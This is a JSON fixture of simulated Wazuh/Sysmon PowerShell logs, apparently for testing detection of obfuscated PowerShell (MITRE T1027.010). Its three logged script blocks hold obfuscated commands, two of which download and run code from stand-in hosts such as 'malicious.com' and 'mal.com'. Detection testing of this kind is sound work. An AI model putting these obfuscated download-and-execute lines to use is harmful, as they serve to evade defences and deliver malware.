{
  "_metadata": {
    "attack_id": "T1027.010",
    "variation": "001",
    "name": "PowerShell Command Obfuscation",
    "description": "Attacker uses various obfuscation techniques in PowerShell",
    "expected_detection": "HIGH",
    "kill_chain_phase": "defense-evasion",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "String concatenation obfuscation",
      "sequence": 1,
      "timestamp": "2026-01-29T15:20:00.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 4104: PowerShell Command Obfuscation",
          "id": "100100",
          "mitre": {
            "id": [
              "T1027.010"
            ],
            "tactic": [
              "Defense Evasion"
            ],
            "technique": [
              "PowerShell Command Obfuscation"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event4104",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.771472300",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "4104",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "providerName": "Microsoft-Windows-PowerShell",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "messageNumber": "1",
              "messageTotal": "1",
              "scriptBlockText": "$a='Inv'+'oke'+'-Web'+'Request';$b='http:'+'//ma'+'lici'+'ous.com'+'/pa'+'yload';iex \"$a $b -OutFile c:\\temp\\p.exe\"",
              "scriptBlockId": "obfusc-001",
              "path": ""
            }
          }
        }
      }
    },
    {
      "_comment": "Character replacement obfuscation",
      "sequence": 2,
      "timestamp": "2026-01-29T15:20:05.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 4104: PowerShell Command Obfuscation",
          "id": "100100",
          "mitre": {
            "id": [
              "T1027.010"
            ],
            "tactic": [
              "Defense Evasion"
            ],
            "technique": [
              "PowerShell Command Obfuscation"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event4104",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.970113952",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "4104",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "providerName": "Microsoft-Windows-PowerShell",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "messageNumber": "1",
              "messageTotal": "1",
              "scriptBlockText": "& ((gv '*mdr*').Name[3,11,2]-join'') (('73Ex'+'28{0}29Get-ProC333s')-f[char]101)",
              "scriptBlockId": "obfusc-002",
              "path": ""
            }
          }
        }
      }
    },
    {
      "_comment": "Tick mark obfuscation",
      "sequence": 3,
      "timestamp": "2026-01-29T15:20:10.000Z",
      "log": {
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 4104: PowerShell Command Obfuscation",
          "id": "100100",
          "mitre": {
            "id": [
              "T1027.010"
            ],
            "tactic": [
              "Defense Evasion"
            ],
            "technique": [
              "PowerShell Command Obfuscation"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event4104",
            "windows"
          ]
        },
        "agent": {
          "id": "020",
          "name": "WS01",
          "ip": "198.51.100.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.861257604",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "4104",
              "channel": "Microsoft-Windows-PowerShell/Operational",
              "providerName": "Microsoft-Windows-PowerShell",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "messageNumber": "1",
              "messageTotal": "1",
              "scriptBlockText": "In`voKe-eX`PresS`iOn (n`Ew`-OBJ`ecT Net.Web`Client).Download`String('http://mal.com/s')",
              "scriptBlockId": "obfusc-003",
              "path": ""
            }
          }
        }
      }
    }
  ]
}
